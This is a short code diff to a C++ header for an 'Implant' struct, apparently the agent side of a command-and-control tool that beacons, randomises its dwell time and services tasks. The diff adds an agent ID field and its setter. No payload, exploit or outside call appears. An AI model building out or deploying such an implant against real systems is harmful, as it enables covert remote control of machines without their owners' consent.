@@ -30,6 +30,7 @@ struct Implant {
 	void beacon();
 	void setMeanDwell(double meanDwell);
 	void setRunning(bool isRunning);
+	void setAgentID(std::string agent_id);
 	void serviceTasks();
 
 private:
@@ -38,6 +39,7 @@ private:
 	// Variables for implant config, dwell time and running status
 	std::exponential_distribution<double> dwellDistributionSeconds;
 	std::atomic_bool isRunning;
+	std::string agent_id;
 	// Define our mutexes since we're doing async I/O stuff
 	std::mutex taskMutex, resultsMutex;
 	// Where we store our results
